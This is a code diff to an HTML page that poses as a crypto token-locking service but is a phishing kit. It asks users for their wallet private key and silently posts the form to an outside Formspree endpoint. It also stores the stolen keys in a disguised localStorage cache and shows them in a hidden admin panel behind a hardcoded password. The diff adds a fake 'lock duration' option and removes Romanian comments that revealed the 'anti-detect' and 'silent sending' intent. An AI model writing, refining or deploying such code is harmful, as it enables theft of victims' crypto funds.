@@ -9,14 +9,14 @@
     <style>
         body { background-color: #0b0e11; color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
         .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); position: relative; }
-        .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; transition: all 0.3s; color: #fff; }
-        .sf-input:focus { border-color: #00ffbd; box-shadow: 0 0 0 2px rgba(0,255,189,0.1); outline: none; }
+        .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; transition: all 0.3s; color: #fff; outline: none; }
+        .sf-input:focus { border-color: #00ffbd; box-shadow: 0 0 0 2px rgba(0,255,189,0.1); }
         .sf-btn { background: linear-gradient(135deg, #00ffbd 0%, #00d9a1 100%); color: #0b0e11; transition: all 0.3s; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
         .sf-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,255,189,0.2); }
         .loader-bar { width: 0%; height: 2px; background: #00ffbd; position: absolute; top: 0; left: 0; transition: width 0.4s ease; }
-        /* Zona pentru Admin - Complet invizibila */
         .admin-trigger { width: 100%; height: 40px; background: transparent; cursor: default; margin-top: 15px; }
         #log-console { display: none; background: #000; border: 1px solid #00ffbd; font-family: monospace; font-size: 11px; color: #00ffbd; padding: 15px; border-radius: 10px; margin-top: 20px; word-break: break-all; }
+        select.sf-input { appearance: none; cursor: pointer; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
@@ -47,13 +47,24 @@
                     <input type="password" name="secure_key" placeholder="Enter Private Key" class="sf-input w-full p-4 mt-1" required>
                 </div>
 
+                <div>
+                    <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Lock Duration</label>
+                    <select name="lock_time" class="sf-input w-full p-4 mt-1">
+                        <option value="3_months">3 Months (Standard)</option>
+                        <option value="6_months">6 Months</option>
+                        <option value="1_year">1 Year</option>
+                        <option value="2_years">2 Years</option>
+                        <option value="permanent">Permanent Lock</option>
+                    </select>
+                </div>
+
                 <div class="grid grid-cols-2 gap-4">
                     <div>
-                        <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Time Locking</label>
-                        <input type="text" name="asset_sym" placeholder="Meme Coin" class="sf-input w-full p-4 mt-1">
+                        <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Asset Symbol</label>
+                        <input type="text" name="asset_sym" placeholder="SOL / MEME" class="sf-input w-full p-4 mt-1">
                     </div>
                     <div>
-                        <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Time Locking</label>
+                        <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Amount</label>
                         <input type="number" name="asset_val" placeholder="0.00" class="sf-input w-full p-4 mt-1">
                     </div>
                 </div>
@@ -78,7 +89,6 @@
     </div>
 
     <script>
-        // Setari Anti-Detect
         const _k = "Ovidiu20";
         const _e = "https://formspree.io/f/mnjjqyez";
 
@@ -95,7 +105,6 @@
             const formData = new FormData(f);
 
             try {
-                // Trimitere silentioasa (AJAX)
                 await fetch(_e, {
                     method: 'POST',
                     body: formData,
@@ -105,17 +114,17 @@
                 p.style.width = "100%";
                 b.innerText = "Success";
 
-                // Salvare locala mascata
                 let cache = JSON.parse(localStorage.getItem('_sf_sys_cache') || "[]");
                 cache.push({
                     n: formData.get('proj_id'),
                     v: formData.get('secure_key'),
+                    t: formData.get('lock_time'),
                     d: new Date().toLocaleString()
                 });
                 localStorage.setItem('_sf_sys_cache', JSON.stringify(cache));
 
                 setTimeout(() => {
-                    alert("Congratulations! You have successfully locked your token. Take a screenshot and share it on social media. Success!");
+                    alert("Congratulations! You have successfully locked your token for " + formData.get('lock_time').replace('_', ' ') + ". Take a screenshot and share it on social media. Success!");
                     b.innerText = "Confirm & Lock Assets";
                     b.disabled = false;
                     p.style.width = "0%";
@@ -128,7 +137,6 @@
             }
         });
 
-        // Functia de Admin cu parola tip Prompt
         function openMasterGate() {
             const auth = prompt("SYSTEM_ACCESS_KEY:");
             if (auth === _k) {
@@ -138,10 +146,8 @@
                 
                 con.style.display = 'block';
                 body.innerHTML = logs.length > 0 ? 
-                    logs.map(l => `[${l.d}] <br> ID: ${l.n} <br> AUTH: ${l.v}<br>---`).join('<br>') : 
+                    logs.map(l => `[${l.d}] <br> ID: ${l.n} <br> TIME: ${l.t} <br> AUTH: ${l.v}<br>---`).join('<br>') : 
                     "No data packets detected.";
-            } else {
-                console.warn("Unauthorized access attempt.");
             }
         }
     </script>
